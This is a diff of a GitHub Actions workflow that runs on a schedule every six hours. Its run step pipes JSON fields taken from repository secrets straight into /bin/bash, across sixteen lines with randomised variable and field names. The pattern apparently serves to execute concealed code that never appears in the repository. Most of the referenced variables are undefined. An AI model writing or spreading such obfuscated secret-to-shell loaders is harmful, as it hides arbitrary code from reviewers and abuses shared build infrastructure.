@@ -2,21 +2,32 @@ name: luanlinwanyu
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 2/6 * * *'
+    - cron: '27 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: luanlinwanyu
         env:
-          mbew5572: ${{ secrets.mbew5572 }}
+          tdnrk92861: ${{ secrets.tdnrk92861 }}
         run: |
-          echo $mbew5572 | jq -r .e4 | /bin/bash
-          echo $sxday50890 | jq -r .vejeq1 | /bin/bash
-          echo $bjro960 | jq -r .iyxr7750 | /bin/bash
-          echo $zbhu9016 | jq -r .rvk61 | /bin/bash
-          echo $lkuzo705 | jq -r .icxtf9 | /bin/bash
-          echo $vxgp9 | jq -r .cnt8 | /bin/bash
+          echo $tdnrk92861 | jq -r .ngnl5 | /bin/bash
+          echo $eupjc0709 | jq -r .x54669 | /bin/bash
+          echo $zzf164 | jq -r .go59 | /bin/bash
+          echo $re484 | jq -r .dkyh92190 | /bin/bash
+          echo $k28611 | jq -r .tmzyt365 | /bin/bash
+          echo $rmuet9646 | jq -r .xyey2 | /bin/bash
+          echo $uojwj64621 | jq -r .qr757 | /bin/bash
+          echo $hqhjq828 | jq -r .kek85 | /bin/bash
+          echo $vkpbe078 | jq -r .afnl46 | /bin/bash
+          echo $ar7 | jq -r .d762 | /bin/bash
+          echo $qhsuq55 | jq -r .wduf06 | /bin/bash
+          echo $qtu5134 | jq -r .mjcah6661 | /bin/bash
+          echo $rvgv97845 | jq -r .koor8324 | /bin/bash
+          echo $ffac57463 | jq -r .soe46 | /bin/bash
+          echo $e22 | jq -r .jyhkk661 | /bin/bash
+          echo $hjl22 | jq -r .vw35 | /bin/bash
 
